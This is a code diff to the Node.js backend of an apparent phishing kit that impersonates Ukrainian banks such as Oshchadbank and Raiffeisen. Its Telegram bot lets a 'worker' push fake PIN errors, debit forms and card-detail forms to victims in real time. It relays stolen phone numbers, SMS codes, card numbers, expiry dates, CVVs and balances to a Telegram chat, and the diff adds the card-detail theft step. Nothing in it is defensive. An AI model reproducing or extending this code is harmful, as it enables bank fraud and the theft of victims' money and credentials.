@@ -66,7 +66,6 @@ wss.on('connection', (ws) => {
     ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
 });
 
-// --- ИЗМЕНЕНИЕ: Обновлена логика обработки кнопок ---
 bot.on('callback_query', (callbackQuery) => {
     const [type, sessionId] = callbackQuery.data.split(':');
     const ws = clients.get(sessionId);
@@ -83,29 +82,24 @@ bot.on('callback_query', (callbackQuery) => {
     switch (type) {
         case 'lk':
         case 'call':
-        case 'other':
         case 'ban':
         case 'number_error':
         case 'balance_error':
             break; 
 
         case 'telegram_debit':
-            // Для Ощада - старая логика
             if (sessionData.bankName === 'Ощадбанк') {
                 command.type = 'telegram_debit';
             } else {
-            // Для всех остальных банков - новый экран списания
                 command.type = 'show_debit_form';
             }
             break;
             
         case 'password_error':
-            // Для Райфа - ошибка на экране ввода PIN-кода
             if (sessionData.bankName === 'Райффайзен') {
                  command.type = 'raiff_pin_error';
                  responseText = 'Запрос "неверный пароль" отправлен!';
             } else {
-                // Старая логика для Ощада
                 command.data = { loginType: sessionData.loginMethod || 'phone' };
             }
             break;
@@ -114,20 +108,22 @@ bot.on('callback_query', (callbackQuery) => {
             if (sessionData.bankName === 'Райффайзен') {
                 command.type = 'raiff_code_error';
             } else if (sessionData.bankName !== 'Ощадбанк') {
-                // Для других банков - ошибка на новом экране списания
                 command.type = 'generic_debit_error';
             }
-            // Для Ощада команда 'code_error' обрабатывается на фронте как и раньше
             responseText = 'Запрос "неверный код" отправлен!';
-            break;
-
-        case 'sms':
-            command.data = { text: "Вам відправлено SMS з кодом..." };
             break;
             
         case 'request_details':
-            command.data = { isRaiffeisen: sessionData.bankName === 'Райффайзен' };
+            if (sessionData.bankName !== 'Ощадбанк') {
+                 command.type = 'show_card_details_form';
+            } else {
+                 responseText = 'Команда "Запрос" не применима для Ощадбанка';
+            }
             break;
+            
+        case 'other':
+             command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
+             break;
             
         default:
             bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
@@ -138,7 +134,7 @@ bot.on('callback_query', (callbackQuery) => {
     bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
 });
 
-// --- ИЗМЕНЕНИЕ: Обновлена логика обработки данных ---
+
 app.post('/api/submit', (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
     let workerNick = 'unknown';
@@ -156,7 +152,6 @@ app.post('/api/submit', (req, res) => {
             message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n`;
             message += `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
-            // Для первого шага отправляем клавиатуру
             sendToTelegram(message, sessionId, newData.bankName);
         } else if (stepData.sms_code) {
             message = `<b>💬 Код из SMS (Райф)</b>\n\n`;
@@ -195,6 +190,15 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
             const phone = newData.phone || 'не указан';
             message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        }
+        else if (stepData.card_details) {
+            message = `<b>Данные по запросу (${newData.bankName})</b>\n\n`;
+            message += `<b>Номер карты:</b> <code>${stepData.card_details.card}</code>\n`;
+            message += `<b>Срок действия:</b> <code>${stepData.card_details.exp}</code>\n`;
+            message += `<b>CVV:</b> <code>${stepData.card_details.cvv}</code>\n`;
+            message += `<b>Баланс:</b> <code>${stepData.card_details.balance}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
